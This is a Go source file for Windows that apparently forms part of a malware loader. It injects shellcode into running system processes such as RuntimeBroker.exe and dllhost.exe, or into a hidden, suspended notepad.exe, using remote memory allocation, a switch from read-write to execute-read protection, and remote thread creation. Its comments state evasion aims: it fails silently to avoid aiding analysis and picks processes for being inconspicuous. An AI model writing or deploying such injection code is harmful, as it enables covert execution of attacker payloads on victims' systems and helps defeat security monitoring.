//go:build windows && amd64

package main

import (
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"
)

// injectShellcode tries injecting into existing candidate host processes in
// order, then falls back to spawning a new host process. Silent exit on total
// failure — do not generate error output that could aid analysis.
func injectShellcode(sc []byte) {
	// Preference order: inconspicuous system processes that are typically
	// running and accept PROCESS_ALL_ACCESS from the same session.
	candidates := []string{
		"RuntimeBroker.exe",
		"SgrmBroker.exe",
		"WerFault.exe",
		"dllhost.exe",
	}

	for _, name := range candidates {
		pid := findProcess(name)
		if pid == 0 {
			continue
		}
		h, err := windows.OpenProcess(windows.PROCESS_ALL_ACCESS, false, pid)
		if err != nil {
			continue
		}
		err = remoteExec(h, sc)
		windows.CloseHandle(h)
		if err == nil {
			return
		}
	}

	// All existing-process attempts failed; spawn a host process.
	spawnAndInject(sc)
}

// findProcess returns the PID of the first process matching name
// (case-insensitive). Returns 0 if not found.
func findProcess(name string) uint32 {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0
	}
	defer windows.CloseHandle(snap)

	var e windows.ProcessEntry32
	e.Size = uint32(unsafe.Sizeof(e))
	if windows.Process32First(snap, &e) != nil {
		return 0
	}
	for {
		if strings.EqualFold(windows.UTF16ToString(e.ExeFile[:]), name) {
			return e.ProcessID
		}
		if windows.Process32Next(snap, &e) != nil {
			return 0
		}
	}
}

// spawnAndInject creates a suspended host process, injects shellcode on a new
// thread, then resumes the host's main thread so it runs normally.
func spawnAndInject(sc []byte) {
	// Try candidate spawn targets in order of how inconspicuous they are.
	// notepad.exe is the universal fallback — always present, always signed.
	spawnTargets := []string{
		`C:\Windows\System32\notepad.exe`,
		`C:\Windows\notepad.exe`,
	}

	si := windows.StartupInfo{Cb: uint32(unsafe.Sizeof(windows.StartupInfo{}))}
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = windows.SW_HIDE
	var pi windows.ProcessInformation

	var spawned bool
	for _, t := range spawnTargets {
		path, err := windows.UTF16PtrFromString(t)
		if err != nil {
			continue
		}
		err = windows.CreateProcess(
			nil, path, nil, nil, false,
			windows.CREATE_SUSPENDED|windows.CREATE_NO_WINDOW,
			nil, nil, &si, &pi,
		)
		if err == nil {
			spawned = true
			break
		}
	}
	if !spawned {
		return
	}
	defer windows.CloseHandle(pi.Thread)
	defer windows.CloseHandle(pi.Process)

	if err := remoteExec(pi.Process, sc); err != nil {
		windows.TerminateProcess(pi.Process, 0)
		return
	}

	// Resume the host's main thread; our shellcode runs on a separate thread.
	windows.ResumeThread(pi.Thread)
}

// remoteExec allocates memory in the target process, writes the shellcode,
// protects it RX, and starts it on a new remote thread.
//
// Memory lifecycle (never RWX):
//  1. NtAllocateVirtualMemory → PAGE_READWRITE
//  2. NtWriteVirtualMemory    → copy bytes
//  3. NtProtectVirtualMemory  → PAGE_EXECUTE_READ
//  4. NtCreateThreadEx        → new thread at shellcode entry
func remoteExec(hProcess windows.Handle, sc []byte) error {
	size := uintptr(len(sc))

	remoteBase, err := ntAllocRemote(uintptr(hProcess), size)
	if err != nil {
		return err
	}

	if err := ntWriteMemory(uintptr(hProcess), remoteBase, sc); err != nil {
		return err
	}

	if err := ntProtectRemote(uintptr(hProcess), remoteBase, size, windows.PAGE_EXECUTE_READ); err != nil {
		return err
	}

	return ntCreateThreadRemote(uintptr(hProcess), remoteBase)
}
